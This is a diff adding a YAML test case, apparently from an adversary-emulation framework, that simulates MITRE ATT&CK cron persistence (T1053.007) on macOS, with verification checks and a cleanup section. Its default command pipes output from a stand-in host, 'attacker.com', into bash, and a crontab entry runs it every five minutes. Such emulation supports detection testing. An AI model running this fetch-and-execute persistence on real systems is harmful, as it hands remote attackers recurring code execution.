@@ -1,0 +1,56 @@
+api_version: 2.0
+uuid: 12345678-bbbb-bbbb-bbbb-bbbbbbbbbbbb
+name: Cron job creation
+description: Creates a cron job for scheduled malicious code execution
+mitre_attack_id: T1053.007
+mitre_attack_technique: Cron
+mitre_attack_tactic: Persistence
+platforms:
+  - darwin
+requirements:
+  platforms:
+    - os: darwin
+args:
+  cron_expression:
+    description: Cron expression for job scheduling
+    type: string
+    default: "*/5 * * * *"
+  cron_command:
+    description: Command to execute via cron
+    type: string
+    default: "/usr/bin/curl -s http://attacker.com/cmd | bash"
+  script_path:
+    description: Path to create cron script
+    type: string
+    default: /usr/local/bin/cron_payload.sh
+steps:
+  - name: create_cron_script
+    type: create_file
+    path: "{{ script_path }}"
+    contents: |
+      #!/bin/bash
+      # Cron job payload
+      {{ cron_command }}
+      echo "Cron job executed at $(date)" >> /tmp/cron.log
+    permissions: "0755"
+  
+  - name: add_cron_job
+    type: shell_command
+    command: |
+      (crontab -l 2>/dev/null; echo "{{ cron_expression }} {{ script_path }}") | crontab -
+
+checks:
+  - type: file_exists
+    path: "{{ script_path }}"
+  - type: shell_command
+    command: "crontab -l | grep {{ script_path }}"
+    expected_output: "{{ script_path }}"
+
+cleanup:
+  - type: shell_command
+    command: |
+      crontab -l 2>/dev/null | grep -v "{{ script_path }}" | crontab - 2>/dev/null || true
+  - type: remove_file
+    path: "{{ script_path }}"
+  - type: remove_file
+    path: "/tmp/cron.log"
